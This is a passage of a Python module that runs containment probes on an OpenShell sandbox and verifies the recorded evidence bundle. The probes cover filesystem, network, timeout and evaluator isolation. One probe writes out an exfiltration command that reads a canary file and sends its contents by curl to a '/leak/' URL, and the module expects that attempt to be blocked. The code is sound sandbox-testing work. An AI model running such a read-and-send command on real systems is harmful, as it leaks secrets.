"""Replayable partial-live evidence from a real OpenShell sandbox.

This module deliberately does not claim that issue #19 reached L3.  It captures
the probes that can be executed without credentials or evaluator secrets and
records the remaining guarantees as unproven.
"""

from __future__ import annotations

import copy
from dataclasses import dataclass
from datetime import datetime, timezone
import hashlib
import json
from pathlib import Path
import re
import secrets
import shutil
import subprocess
import time
from typing import Any, Callable
from urllib.parse import urlparse

from .ci_live_evidence import EvidenceVerificationError
from .contracts import CandidateRef, EvidenceMode, RunManifest, TaskSpec


EVIDENCE_SCHEMA = "blackbox-openshell-evidence/v4"
TRAJECTORY_SCHEMA = "blackbox-openshell-trajectory/v4"
OUTCOME_SCHEMA = "blackbox-openshell-outcome/v4"
VERIFICATION_SCHEMA = "blackbox-openshell-verification/v4"
CURRENT_MATURITY = "L1 REFERENCE"
EVALUATOR_SANDBOX_PATH = "/evaluator/canary.txt"
_DIGEST_RE = re.compile(r"^sha256:[0-9a-f]{64}$")
_VERSION_RE = re.compile(r"^openshell ([0-9]+\.[0-9]+\.[0-9]+)$")
_UUID_RE = re.compile(r"\b[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}\b")
CANDIDATE = "#!/bin/sh\nset -eu\nprintf 'openshell-live-evidence-v1\\n' > /sandbox/outcome.txt\ncat /sandbox/outcome.txt\n"


@dataclass(frozen=True)
class OpenShellRunConfig:
    run_id: str
    sandbox_name: str
    image_digest: str
    expected_version: str
    allowed_url: str
    denied_url: str

    def __post_init__(self) -> None:
        if not self.run_id.strip() or not self.sandbox_name.strip():
            raise ValueError("run_id and sandbox_name must be non-empty")
        if not _DIGEST_RE.fullmatch(self.image_digest):
            raise ValueError("image_digest must be sha256:<64 lowercase hex chars>")
        if not re.fullmatch(r"[0-9]+\.[0-9]+\.[0-9]+", self.expected_version):
            raise ValueError("expected_version must be a semantic version")
        for name in ("allowed_url", "denied_url"):
            parsed = urlparse(getattr(self, name))
            if parsed.scheme != "https" or not parsed.hostname or parsed.port not in (None, 443):
                raise ValueError(f"{name} must be an https URL on port 443")
        if urlparse(self.allowed_url).hostname == urlparse(self.denied_url).hostname:
            raise ValueError("allowed and denied URLs must use different hosts")


@dataclass(frozen=True)
class CommandResult:
    argv: tuple[str, ...]
    returncode: int
    stdout: str
    stderr: str


Runner = Callable[[tuple[str, ...]], CommandResult]


def _canonical_bytes(value: object) -> bytes:
    return json.dumps(value, sort_keys=True, separators=(",", ":")).encode()


def _digest_bytes(value: bytes) -> str:
    return "sha256:" + hashlib.sha256(value).hexdigest()


def _digest_file(path: Path) -> str:
    if not path.is_file() or path.is_symlink():
        raise EvidenceVerificationError(f"required regular file is missing: {path.name}")
    return _digest_bytes(path.read_bytes())


def _write_json(path: Path, value: object) -> None:
    path.write_bytes(_canonical_bytes(value) + b"\n")


def _read_json(path: Path) -> dict[str, Any]:
    if not path.is_file() or path.is_symlink():
        raise EvidenceVerificationError(f"required regular file is missing: {path.name}")
    try:
        value = json.loads(path.read_bytes())
    except (OSError, json.JSONDecodeError) as exc:
        raise EvidenceVerificationError(f"invalid JSON in {path.name}: {exc}") from exc
    if not isinstance(value, dict):
        raise EvidenceVerificationError(f"{path.name} must contain a JSON object")
    return value


def subprocess_runner(argv: tuple[str, ...]) -> CommandResult:
    completed = subprocess.run(argv, capture_output=True, text=True, timeout=120)
    return CommandResult(argv, completed.returncode, completed.stdout, completed.stderr)


def _event(name: str, result: CommandResult) -> dict[str, object]:
    return {"name": name, "argv": list(result.argv), "returncode": result.returncode,
            "stdout": result.stdout, "stderr": result.stderr}


def _require_code(result: CommandResult, expected: int, name: str) -> None:
    if result.returncode != expected:
        raise RuntimeError(
            f"{name} returned {result.returncode}, expected {expected}: {result.stderr.strip()}"
        )


def _absence_event(
    name: str,
    argv: tuple[str, ...],
    *,
    runner: Runner,
    attempts: int = 10,
) -> dict[str, object]:
    observations = []
    for attempt in range(1, attempts + 1):
        result = runner(argv)
        observations.append({
            "attempt": attempt, "returncode": result.returncode,
            "stdout": result.stdout, "stderr": result.stderr,
        })
        if result.returncode != 0:
            return {"name": name, "argv": list(argv), "returncode": result.returncode,
                    "stdout": result.stdout, "stderr": result.stderr,
                    "observations": observations}
        if runner is subprocess_runner:
            time.sleep(0.5)
    return {"name": name, "argv": list(argv), "returncode": 0,
            "stdout": observations[-1]["stdout"], "stderr": observations[-1]["stderr"],
            "observations": observations}


def _policy_spec(config: OpenShellRunConfig) -> dict[str, object]:
    host = urlparse(config.allowed_url).hostname
    return {
        "allowed_endpoint": f"{host}:443:read-only:rest:enforce",
        "allowed_rule": f"{host}:443:GET:/**",
        "binary": "/usr/bin/curl",
        "credentials": [],
        "evaluator_path": EVALUATOR_SANDBOX_PATH,
        "evaluator_initial_access": "absent",
        "evaluator_unlock": "read_only",
        "evaluator_unix_mode": "world-readable-writable-test-canary",
    }


def _temporary_base_tag(config: OpenShellRunConfig) -> str:
    suffix = hashlib.sha256(config.run_id.encode()).hexdigest()[:16]
    return f"blackbox-openshell-base:{suffix}"


def _evaluator_dockerfile(config: OpenShellRunConfig) -> str:
    return (
        f"FROM {_temporary_base_tag(config)}\n"
        "USER root\n"
        "RUN mkdir -p /evaluator && chmod 0777 /evaluator\n"
        "COPY evaluator-source.txt /evaluator/canary.txt\n"
        "RUN chmod 0666 /evaluator/canary.txt\n"
        "USER sandbox\n"
    )


def _run_manifest(
    config: OpenShellRunConfig,
    *,
    candidate_digest: str,
    environment_digest: str,
    harness_digest: str,
    evaluator_digest: str,
    policy_digest: str,
) -> RunManifest:
    return RunManifest(
        run_id=config.run_id,
        task=TaskSpec(
            task_id="openshell-policy-probes/v1",
            digest=_digest_bytes(b"openshell-policy-probes/v1"),
            objective="Capture real OpenShell policy and teardown evidence",
            evidence_mode=EvidenceMode.GRAY,
        ),
        candidate=CandidateRef("openshell-probe-candidate/v1", candidate_digest),
        environment_digest=environment_digest,
        harness_digest=harness_digest,
        evaluator_digest=evaluator_digest,
        policy_digest=policy_digest,
        seed=0,
        max_actions=30,
        max_seconds=120,
        max_tokens=1,
        max_cost_usd=0,
    )


def produce_openshell_evidence(
    output_dir: Path,
    *,
    config: OpenShellRunConfig,
    harness_path: Path,
    evaluator_path: Path,
    runner: Runner = subprocess_runner,
) -> dict[str, object]:
    if runner is subprocess_runner:
        for executable in ("openshell", "docker"):
            if shutil.which(executable) is None:
                raise RuntimeError(f"{executable} is unavailable; host fallback is forbidden")
    started_at = datetime.now(timezone.utc)
    output_dir.mkdir(parents=True, exist_ok=False)
    candidate_path = output_dir / "candidate.sh"
    candidate_path.write_text(CANDIDATE)
    candidate_digest = _digest_file(candidate_path)
    evaluator_source_path = output_dir / "evaluator-source.txt"
    evaluator_source_path.write_text(secrets.token_hex(32) + "\n")
    evaluator_artifact_digest = _digest_file(evaluator_source_path)
    temporary_base_tag = _temporary_base_tag(config)
    dockerfile_path = output_dir / "Dockerfile.evaluator"
    dockerfile_path.write_text(_evaluator_dockerfile(config))
    evaluator_identity = _digest_bytes(_canonical_bytes({
        "artifact": evaluator_artifact_digest,
        "sandbox_path": EVALUATOR_SANDBOX_PATH,
        "verifier": _digest_file(evaluator_path),
    }))
    spec = _policy_spec(config)
    policy_path = output_dir / "requested-policy.json"
    _write_json(policy_path, spec)
    policy_digest = _digest_file(policy_path)
    version = runner(("openshell", "--version"))
    _require_code(version, 0, "version probe")
    match = _VERSION_RE.fullmatch(version.stdout.strip())
    if not match or match.group(1) != config.expected_version:
        raise RuntimeError(
            f"OpenShell version drift: expected {config.expected_version}, got {version.stdout.strip()!r}"
        )
    events = [_event("version", version)]
    candidate_created = False
    verifier_created = False
    image_built = False
    base_tag_created = False
    verifier_sandbox_name = config.sandbox_name + "-verifier"
    try:
        tag_preflight = runner(("docker", "image", "inspect", temporary_base_tag))
        events.append(_event("base-tag-preflight", tag_preflight))
        if tag_preflight.returncode == 0:
            raise RuntimeError(f"temporary base tag already exists: {temporary_base_tag}")
        tag_create = runner((
            "docker", "image", "tag", config.image_digest, temporary_base_tag,
        ))
        events.append(_event("base-tag-create", tag_create))
        _require_code(tag_create, 0, "temporary base tag creation")
        base_tag_created = True
        tag_inspect = runner((
            "docker", "image", "inspect", "--format", "{{.Id}}", temporary_base_tag,
        ))
        events.append(_event("base-tag-inspect", tag_inspect))
        _require_code(tag_inspect, 0, "temporary base tag identity")
        if tag_inspect.stdout.strip() != config.image_digest:
            raise RuntimeError("temporary base tag does not resolve to the pinned image ID")
        image_build = runner((
            "docker", "build", "--pull=false", "--no-cache", "--quiet",
            "--file", str(dockerfile_path), str(output_dir),
        ))
        events.append(_event("image-build", image_build))
        _require_code(image_build, 0, "evaluator image build")
        derived_image_digest = image_build.stdout.strip()
        if not _DIGEST_RE.fullmatch(derived_image_digest):
            raise RuntimeError("docker build did not return an immutable image digest")
        image_built = True
        environment = {
            "provider": "openshell", "version": config.expected_version,
            "base_image_digest": config.image_digest,
            "derived_image_digest": derived_image_digest,
            "temporary_base_tag": temporary_base_tag,
        }
        environment_digest = _digest_bytes(_canonical_bytes(environment))
        manifest_contract = _run_manifest(
            config,
            candidate_digest=candidate_digest,
            environment_digest=environment_digest,
            harness_digest=_digest_file(harness_path),
            evaluator_digest=evaluator_identity,
            policy_digest=policy_digest,
        )
        create = runner((
            "openshell", "sandbox", "create", "--name", config.sandbox_name,
            "--from", derived_image_digest, "--no-auto-providers", "--no-tty", "--", "/bin/true",
        ))
        events.append(_event("candidate-create", create))
        _require_code(create, 0, "sandbox create")
        candidate_created = True
        sandbox_get = runner(("openshell", "sandbox", "get", config.sandbox_name))
        events.append(_event("candidate-get", sandbox_get))
        _require_code(sandbox_get, 0, "sandbox identity")
        sandbox_id_match = _UUID_RE.search(sandbox_get.stdout)
        if not sandbox_id_match:
            raise RuntimeError("sandbox identity did not contain a UUID")
        sandbox_id = sandbox_id_match.group(0)
        update = runner((
            "openshell", "policy", "update", config.sandbox_name,
            "--add-endpoint", str(spec["allowed_endpoint"]),
            "--binary", str(spec["binary"]), "--add-allow", str(spec["allowed_rule"]), "--wait",
        ))
        events.append(_event("policy-update", update))
        _require_code(update, 0, "policy update")
        policy = runner(("openshell", "policy", "get", config.sandbox_name, "--full", "--output", "json"))
        events.append(_event("effective-policy", policy))
        _require_code(policy, 0, "effective policy")
        try:
            effective_policy = json.loads(policy.stdout)
        except json.JSONDecodeError as exc:
            raise RuntimeError(f"effective policy was not JSON: {exc}") from exc
        effective_policy_path = output_dir / "effective-policy.json"
        _write_json(effective_policy_path, effective_policy)
        upload = runner(("openshell", "sandbox", "upload", config.sandbox_name,
                         str(candidate_path), "/sandbox/candidate.sh"))
        events.append(_event("candidate-upload", upload))
        _require_code(upload, 0, "candidate upload")
        locked_policy = effective_policy.get("policy")
        if not isinstance(locked_policy, dict):
            raise RuntimeError("effective policy payload was not an object")
        filesystem = locked_policy.get("filesystem_policy")
        if not isinstance(filesystem, dict) or any(
            path == "/evaluator"
            for mode in ("read_only", "read_write") for path in filesystem.get(mode, [])
        ):
            raise RuntimeError("effective policy unexpectedly exposed the evaluator path")
        locked_policy_path = output_dir / "locked-policy.json"
        _write_json(locked_policy_path, locked_policy)
        unlocked_policy = copy.deepcopy(locked_policy)
        unlocked_policy["filesystem_policy"].setdefault("read_only", []).append("/evaluator")
        unlocked_policy_path = output_dir / "unlocked-policy.json"
        _write_json(unlocked_policy_path, unlocked_policy)
        exfiltration_command = (
            f"set -e; value=$(/usr/bin/cat {EVALUATOR_SANDBOX_PATH}); "
            f'/usr/bin/curl -sS -o /dev/null "{config.allowed_url.rstrip("/")}/leak/$value"'
        )
        probes = [
            ("candidate", ("openshell", "sandbox", "exec", "--name", config.sandbox_name,
                           "--no-tty", "--", "/bin/sh", "/sandbox/candidate.sh")),
            ("read-only-deny", ("openshell", "sandbox", "exec", "--name", config.sandbox_name,
                                "--no-tty", "--", "/usr/bin/touch", "/etc/blackbox-evidence-probe")),
            ("network-allow", ("openshell", "sandbox", "exec", "--name", config.sandbox_name,
                               "--no-tty", "--", "/usr/bin/curl", "-fsS", "-o", "/dev/null", config.allowed_url)),
            ("network-deny", ("openshell", "sandbox", "exec", "--name", config.sandbox_name,
                              "--no-tty", "--", "/usr/bin/curl", "-fsS", "-o", "/dev/null", config.denied_url)),
            ("budget-abort", ("openshell", "sandbox", "exec", "--name", config.sandbox_name,
                              "--timeout", "1", "--no-tty", "--", "/bin/sleep", "5")),
            ("evaluator-read-deny", (
                "openshell", "sandbox", "exec", "--name", config.sandbox_name,
                "--no-tty", "--", "/usr/bin/cat", EVALUATOR_SANDBOX_PATH,
            )),
            ("evaluator-mutation-deny", (
                "openshell", "sandbox", "exec", "--name", config.sandbox_name,
                "--no-tty", "--", "/bin/sh", "-c",
                f"printf forged > {EVALUATOR_SANDBOX_PATH}",
            )),
            ("evaluator-exfiltration-deny", (
                "openshell", "sandbox", "exec", "--name", config.sandbox_name,
                "--no-tty", "--", "/bin/sh", "-c", exfiltration_command,
            )),
        ]
        probe_results: dict[str, CommandResult] = {}
        for name, argv in probes:
            probe_results[name] = runner(argv)
            events.append(_event(name, probe_results[name]))
        _require_code(probe_results["candidate"], 0, "candidate")
        _require_code(probe_results["network-allow"], 0, "allowed network probe")
        if probe_results["read-only-deny"].returncode == 0:
            raise RuntimeError("read-only filesystem probe unexpectedly succeeded")
        if probe_results["network-deny"].returncode == 0:
            raise RuntimeError("denied network probe unexpectedly succeeded")
        _require_code(probe_results["budget-abort"], 124, "budget abort")
        for name in (
            "evaluator-read-deny", "evaluator-mutation-deny", "evaluator-exfiltration-deny"
        ):
            if probe_results[name].returncode == 0:
                raise RuntimeError(f"{name} unexpectedly succeeded")
        download = runner(("openshell", "sandbox", "download", config.sandbox_name,
                           "/sandbox/outcome.txt", str(output_dir / "outcome.txt")))
        events.append(_event("outcome-download", download))
        _require_code(download, 0, "outcome download")
        candidate_delete = runner(("openshell", "sandbox", "delete", config.sandbox_name))
        events.append(_event("candidate-delete", candidate_delete))
        _require_code(candidate_delete, 0, "candidate sandbox teardown")
        candidate_absence = _absence_event(
            "candidate-absence", ("openshell", "sandbox", "get", config.sandbox_name),
            runner=runner,
        )
        events.append(candidate_absence)
        if candidate_absence["returncode"] == 0:
            raise RuntimeError("candidate sandbox still exists after teardown wait")
        candidate_created = False
        verifier_create = runner((
            "openshell", "sandbox", "create", "--name", verifier_sandbox_name,
            "--from", derived_image_digest, "--policy", str(unlocked_policy_path),
            "--no-auto-providers", "--no-tty", "--", "/bin/true",
        ))
        events.append(_event("verifier-create", verifier_create))
        _require_code(verifier_create, 0, "verifier sandbox create")
        verifier_created = True
        verifier_get = runner(("openshell", "sandbox", "get", verifier_sandbox_name))
        events.append(_event("verifier-get", verifier_get))
        _require_code(verifier_get, 0, "verifier sandbox identity")
        verifier_id_match = _UUID_RE.search(verifier_get.stdout)
        if not verifier_id_match:
            raise RuntimeError("verifier sandbox identity did not contain a UUID")
        verifier_sandbox_id = verifier_id_match.group(0)
        evaluator_readback = runner((
            "openshell", "sandbox", "exec", "--name", verifier_sandbox_name,
            "--no-tty", "--", "/usr/bin/cat", EVALUATOR_SANDBOX_PATH,
        ))
        events.append(_event("evaluator-readback", evaluator_readback))
        _require_code(evaluator_readback, 0, "evaluator artifact readback")
        evaluator_after_path = output_dir / "evaluator-after.txt"
        evaluator_after_path.write_text(evaluator_readback.stdout)
        verifier_delete = runner(("openshell", "sandbox", "delete", verifier_sandbox_name))
        events.append(_event("verifier-delete", verifier_delete))
        _require_code(verifier_delete, 0, "verifier sandbox teardown")
        verifier_absence = _absence_event(
            "verifier-absence", ("openshell", "sandbox", "get", verifier_sandbox_name),
            runner=runner,
        )
        events.append(verifier_absence)
        if verifier_absence["returncode"] == 0:
            raise RuntimeError("verifier sandbox still exists after teardown wait")
        verifier_created = False
    finally:
        cleanup_errors = []
        for active, sandbox_name, prefix in (
            (candidate_created, config.sandbox_name, "candidate-finally"),
            (verifier_created, verifier_sandbox_name, "verifier-finally"),
        ):
            if active:
                deleted = runner(("openshell", "sandbox", "delete", sandbox_name))
                events.append(_event(prefix + "-delete", deleted))
                if deleted.returncode != 0:
                    cleanup_errors.append(f"{prefix} delete returned {deleted.returncode}")
                absent = _absence_event(
                    prefix + "-absence", ("openshell", "sandbox", "get", sandbox_name),
                    runner=runner,
                )
                events.append(absent)
                if absent["returncode"] == 0:
                    cleanup_errors.append(f"{prefix} sandbox remained present")
        if image_built:
            image_remove = runner(("docker", "image", "rm", derived_image_digest))
            events.append(_event("image-remove", image_remove))
            if image_remove.returncode != 0:
                cleanup_errors.append(f"derived image cleanup returned {image_remove.returncode}")
            image_absence = runner(("docker", "image", "inspect", derived_image_digest))
            events.append(_event("image-absence", image_absence))
            if image_absence.returncode == 0:
                cleanup_errors.append("derived evaluator image still exists after cleanup")
        if base_tag_created:
            tag_remove = runner(("docker", "image", "rm", temporary_base_tag))
            events.append(_event("base-tag-remove", tag_remove))
            if tag_remove.returncode != 0:
                cleanup_errors.append(f"temporary base tag cleanup returned {tag_remove.returncode}")
            tag_absence = runner(("docker", "image", "inspect", temporary_base_tag))
            events.append(_event("base-tag-absence", tag_absence))
            if tag_absence.returncode == 0:
                cleanup_errors.append("temporary base tag still exists after cleanup")
        if cleanup_errors:
            raise RuntimeError("; ".join(cleanup_errors))
    trajectory = {"schema": TRAJECTORY_SCHEMA, "run_id": config.run_id, "events": events}
    trajectory_path = output_dir / "trajectory.json"
    _write_json(trajectory_path, trajectory)
    outcome_path = output_dir / "outcome.txt"
    expected_outcome_digest = _digest_bytes(b"openshell-live-evidence-v1\n")
    if _digest_file(outcome_path) != expected_outcome_digest:
        raise RuntimeError("downloaded outcome does not match the pinned candidate result")
    if _digest_file(evaluator_after_path) != evaluator_artifact_digest:
        raise RuntimeError("evaluator artifact changed during candidate execution")
    outcome = {
        "schema": OUTCOME_SCHEMA,
        "verified_probes": ["writable-filesystem", "read-only-filesystem-deny", "network-allow",
                            "network-deny", "budget-abort", "evaluator-read-deny",
                            "evaluator-mutation-deny", "evaluator-exfiltration-deny", "teardown"],
        "unproven_probes": ["credential-broker"],
        "maturity_before": CURRENT_MATURITY,
        "maturity_after": CURRENT_MATURITY,
        "evaluator_artifact_digest": evaluator_artifact_digest,
        "outcome_digest": expected_outcome_digest,
    }
    outcome_json_path = output_dir / "outcome.json"
    _write_json(outcome_json_path, outcome)
    finished_at = datetime.now(timezone.utc)
    manifest = {
        "schema": EVIDENCE_SCHEMA,
        "status": "partial-live-evidence",
        "run_manifest": json.loads(manifest_contract.canonical_json()),
        "environment": environment,
        "runtime": {
            "candidate_sandbox_id": sandbox_id,
            "candidate_sandbox_name": config.sandbox_name,
            "verifier_sandbox_id": verifier_sandbox_id,
            "verifier_sandbox_name": verifier_sandbox_name,
        },
        "timing": {"started_at": started_at.isoformat(), "finished_at": finished_at.isoformat()},
        "evidence": {
            name: {"path": path.name, "digest": _digest_file(path)}
            for name, path in {
                "candidate": candidate_path,
                "evaluator_dockerfile": dockerfile_path,
                "evaluator_source": evaluator_source_path,
                "evaluator_after": evaluator_after_path,
                "requested_policy": policy_path,
                "effective_policy": effective_policy_path,
                "locked_policy": locked_policy_path,
                "unlocked_policy": unlocked_policy_path,
                "trajectory": trajectory_path,
                "outcome": outcome_json_path,
                "final_state": outcome_path,
            }.items()
        },
    }
    _write_json(output_dir / "manifest.json", manifest)
    return manifest


def verify_openshell_evidence(
    bundle_dir: Path,
    *,
    expected_config: OpenShellRunConfig,
    harness_path: Path,
    evaluator_path: Path,
) -> dict[str, object]:
    manifest = _read_json(bundle_dir / "manifest.json")
    trajectory = _read_json(bundle_dir / "trajectory.json")
    outcome = _read_json(bundle_dir / "outcome.json")
    if set(manifest) != {
        "schema", "status", "run_manifest", "environment", "runtime", "timing", "evidence"
    }:
        raise EvidenceVerificationError("manifest keys drift")
    if manifest["schema"] != EVIDENCE_SCHEMA or manifest["status"] != "partial-live-evidence":
        raise EvidenceVerificationError("manifest identity drift")
    evidence = manifest.get("evidence")
    if not isinstance(evidence, dict):
        raise EvidenceVerificationError("manifest evidence must be an object")
    expected_files = {
        "candidate": "candidate.sh", "evaluator_dockerfile": "Dockerfile.evaluator",
        "evaluator_source": "evaluator-source.txt",
        "evaluator_after": "evaluator-after.txt", "requested_policy": "requested-policy.json",
        "effective_policy": "effective-policy.json", "locked_policy": "locked-policy.json",
        "unlocked_policy": "unlocked-policy.json", "trajectory": "trajectory.json",
        "outcome": "outcome.json", "final_state": "outcome.txt",
    }
    if set(evidence) != set(expected_files):
        raise EvidenceVerificationError("evidence set drift")
    for name, filename in expected_files.items():
        record = evidence[name]
        if record != {"path": filename, "digest": _digest_file(bundle_dir / filename)}:
            raise EvidenceVerificationError(f"{name} evidence digest mismatch")
    environment = manifest.get("environment")
    if not isinstance(environment, dict) or set(environment) != {
        "provider", "version", "base_image_digest", "derived_image_digest",
        "temporary_base_tag"
    } or environment.get("provider") != "openshell" \
            or environment.get("version") != expected_config.expected_version \
            or environment.get("base_image_digest") != expected_config.image_digest \
            or environment.get("temporary_base_tag") != _temporary_base_tag(expected_config) \
            or not _DIGEST_RE.fullmatch(str(environment.get("derived_image_digest", ""))):
        raise EvidenceVerificationError("environment drift")
    runtime = manifest.get("runtime")
    if not isinstance(runtime, dict) or runtime.get("candidate_sandbox_name") != expected_config.sandbox_name \
            or runtime.get("verifier_sandbox_name") != expected_config.sandbox_name + "-verifier" \
            or not _UUID_RE.fullmatch(str(runtime.get("candidate_sandbox_id", ""))) \
            or not _UUID_RE.fullmatch(str(runtime.get("verifier_sandbox_id", ""))):
        raise EvidenceVerificationError("sandbox runtime identity drift")
    timing = manifest.get("timing")
    if not isinstance(timing, dict) or set(timing) != {"started_at", "finished_at"}:
        raise EvidenceVerificationError("timing contract drift")
    try:
        started_at = datetime.fromisoformat(str(timing["started_at"]))
        finished_at = datetime.fromisoformat(str(timing["finished_at"]))
    except ValueError as exc:
        raise EvidenceVerificationError("timing must contain ISO-8601 timestamps") from exc
    if started_at.tzinfo is None or finished_at.tzinfo is None or finished_at < started_at:
        raise EvidenceVerificationError("timing order or timezone drift")
    requested_policy = _read_json(bundle_dir / "requested-policy.json")
    if requested_policy != _policy_spec(expected_config):
        raise EvidenceVerificationError("requested policy drift")
    evaluator_artifact_digest = _digest_file(bundle_dir / "evaluator-source.txt")
    if (bundle_dir / "Dockerfile.evaluator").read_text() != _evaluator_dockerfile(expected_config):
        raise EvidenceVerificationError("evaluator Dockerfile drift")
    evaluator_identity = _digest_bytes(_canonical_bytes({
        "artifact": evaluator_artifact_digest,
        "sandbox_path": EVALUATOR_SANDBOX_PATH,
        "verifier": _digest_file(evaluator_path),
    }))
    expected_contract = json.loads(
        _run_manifest(
            expected_config,
            candidate_digest=_digest_file(bundle_dir / "candidate.sh"),
            environment_digest=_digest_bytes(_canonical_bytes(environment)),
            harness_digest=_digest_file(harness_path),
            evaluator_digest=evaluator_identity,
            policy_digest=_digest_file(bundle_dir / "requested-policy.json"),
        ).canonical_json()
    )
    if manifest.get("run_manifest") != expected_contract:
        raise EvidenceVerificationError("run manifest drift")
    effective_policy = _read_json(bundle_dir / "effective-policy.json")
    if effective_policy.get("status") != "effective" or not re.fullmatch(
        r"[0-9a-f]{64}", str(effective_policy.get("hash", ""))
    ):
        raise EvidenceVerificationError("effective policy identity drift")
    policy = effective_policy.get("policy")
    if not isinstance(policy, dict):
        raise EvidenceVerificationError("effective policy payload drift")
    filesystem = policy.get("filesystem_policy")
    if not isinstance(filesystem, dict) or "/etc" not in filesystem.get("read_only", []) \
            or "/sandbox" not in filesystem.get("read_write", []):
        raise EvidenceVerificationError("effective filesystem policy drift")
    allowed_host = urlparse(expected_config.allowed_url).hostname
    network = policy.get("network_policies")
    if not isinstance(network, dict):
        raise EvidenceVerificationError("effective network policy drift")
    endpoint_matches = [
        endpoint
        for rule in network.values() if isinstance(rule, dict)
        for endpoint in rule.get("endpoints", []) if isinstance(endpoint, dict)
        if endpoint.get("host") == allowed_host and endpoint.get("port") == 443
    ]
    binary_matches = [
        binary
        for rule in network.values() if isinstance(rule, dict)
        for binary in rule.get("binaries", []) if isinstance(binary, dict)
        if binary.get("path") == "/usr/bin/curl"
    ]
    if not endpoint_matches or not binary_matches:
        raise EvidenceVerificationError("effective network allow policy drift")
    locked_policy = _read_json(bundle_dir / "locked-policy.json")
    unlocked_policy = _read_json(bundle_dir / "unlocked-policy.json")
    locked_filesystem = locked_policy.get("filesystem_policy")
    if locked_policy != policy or not isinstance(locked_filesystem, dict) \
            or any("/evaluator" in locked_filesystem.get(mode, []) for mode in ("read_only", "read_write")):
        raise EvidenceVerificationError("locked filesystem policy drift")
    expected_unlocked = copy.deepcopy(locked_policy)
    expected_unlocked["filesystem_policy"].setdefault("read_only", []).append("/evaluator")
    if unlocked_policy != expected_unlocked:
        raise EvidenceVerificationError("unlocked policy drift")
    if trajectory.get("schema") != TRAJECTORY_SCHEMA or trajectory.get("run_id") != expected_config.run_id:
        raise EvidenceVerificationError("trajectory identity drift")
    events = trajectory.get("events")
    if not isinstance(events, list):
        raise EvidenceVerificationError("trajectory events must be a list")
    by_name = {event.get("name"): event for event in events if isinstance(event, dict)}
    expected_sequence = [
        "version", "base-tag-preflight", "base-tag-create", "base-tag-inspect", "image-build",
        "candidate-create", "candidate-get", "policy-update", "effective-policy",
        "candidate-upload",
        "candidate", "read-only-deny", "network-allow", "network-deny", "budget-abort",
        "evaluator-read-deny", "evaluator-mutation-deny", "evaluator-exfiltration-deny",
        "outcome-download", "candidate-delete", "candidate-absence", "verifier-create",
        "verifier-get", "evaluator-readback", "verifier-delete", "verifier-absence",
        "image-remove", "image-absence", "base-tag-remove",
        "base-tag-absence",
    ]
    if [event.get("name") for event in events if isinstance(event, dict)] != expected_sequence \
            or len(events) != len(expected_sequence):
        raise EvidenceVerificationError("trajectory event set drift")
    expected_codes = {"version": 0, "base-tag-create": 0, "base-tag-inspect": 0,
                      "image-build": 0, "candidate-create": 0, "candidate-get": 0,
                      "policy-update": 0, "effective-policy": 0,
                      "candidate-upload": 0, "candidate": 0,
                      "network-allow": 0, "budget-abort": 124, "outcome-download": 0,
                      "candidate-delete": 0, "verifier-create": 0, "verifier-get": 0,
                      "evaluator-readback": 0, "verifier-delete": 0,
                      "image-remove": 0, "base-tag-remove": 0}
    for name, code in expected_codes.items():
        if by_name.get(name, {}).get("returncode") != code:
            raise EvidenceVerificationError(f"{name} result drift")
    for name in (
        "read-only-deny", "network-deny", "evaluator-read-deny",
        "evaluator-mutation-deny", "evaluator-exfiltration-deny",
        "base-tag-preflight", "candidate-absence", "verifier-absence", "image-absence",
        "base-tag-absence"
    ):
        code = by_name.get(name, {}).get("returncode")
        if not isinstance(code, int) or isinstance(code, bool) or code == 0:
            raise EvidenceVerificationError(f"{name} did not fail closed")
    canary = (bundle_dir / "evaluator-source.txt").read_text().strip()
    for name in (
        "evaluator-read-deny", "evaluator-mutation-deny", "evaluator-exfiltration-deny"
    ):
        event_output = str(by_name[name].get("stdout", "")) + str(by_name[name].get("stderr", ""))
        if canary in event_output:
            raise EvidenceVerificationError(f"{name} exposed evaluator canary")
    expected_create = [
        "openshell", "sandbox", "create", "--name", expected_config.sandbox_name,
        "--from", environment["derived_image_digest"], "--no-auto-providers", "--no-tty", "--", "/bin/true",
    ]
    if by_name["candidate-create"].get("argv") != expected_create:
        raise EvidenceVerificationError("sandbox create command drift")
    if runtime["candidate_sandbox_id"] not in str(by_name["candidate-get"].get("stdout", "")):
        raise EvidenceVerificationError("sandbox identity event drift")
    spec = _policy_spec(expected_config)
    expected_update = [
        "openshell", "policy", "update", expected_config.sandbox_name,
        "--add-endpoint", spec["allowed_endpoint"], "--binary", spec["binary"],
        "--add-allow", spec["allowed_rule"], "--wait",
    ]
    if by_name["policy-update"].get("argv") != expected_update:
        raise EvidenceVerificationError("policy update command drift")
    if by_name["network-allow"].get("argv", [])[-1:] != [expected_config.allowed_url]:
        raise EvidenceVerificationError("allowed network target drift")
    if by_name["network-deny"].get("argv", [])[-1:] != [expected_config.denied_url]:
        raise EvidenceVerificationError("denied network target drift")
    expected_build = [
        "docker", "build", "--pull=false", "--no-cache", "--quiet", "--file",
        str(bundle_dir / "Dockerfile.evaluator"), str(bundle_dir),
    ]
    if by_name["image-build"].get("argv") != expected_build \
            or by_name["image-build"].get("stdout", "").strip() != environment["derived_image_digest"]:
        raise EvidenceVerificationError("evaluator image build drift")
    temporary_base_tag = _temporary_base_tag(expected_config)
    if by_name["base-tag-create"].get("argv") != [
        "docker", "image", "tag", expected_config.image_digest, temporary_base_tag
    ] or by_name["base-tag-inspect"].get("argv") != [
        "docker", "image", "inspect", "--format", "{{.Id}}", temporary_base_tag
    ] or by_name["base-tag-inspect"].get("stdout", "").strip() != expected_config.image_digest:
        raise EvidenceVerificationError("temporary base tag identity drift")
    expected_exfiltration = (
        f"set -e; value=$(/usr/bin/cat {EVALUATOR_SANDBOX_PATH}); "
        f'/usr/bin/curl -sS -o /dev/null "{expected_config.allowed_url.rstrip("/")}/leak/$value"'
    )
    verifier_name = expected_config.sandbox_name + "-verifier"
    expected_verifier_create = [
        "openshell", "sandbox", "create", "--name", verifier_name,
        "--from", environment["derived_image_digest"], "--policy",
        str(bundle_dir / "unlocked-policy.json"), "--no-auto-providers", "--no-tty", "--",
        "/bin/true",
    ]
    if by_name["verifier-create"].get("argv") != expected_verifier_create \
            or runtime["verifier_sandbox_id"] not in str(by_name["verifier-get"].get("stdout", "")):
        raise EvidenceVerificationError("verifier sandbox identity drift")
    if by_name["evaluator-readback"].get("argv") != [
        "openshell", "sandbox", "exec", "--name", verifier_name,
        "--no-tty", "--", "/usr/bin/cat", EVALUATOR_SANDBOX_PATH,
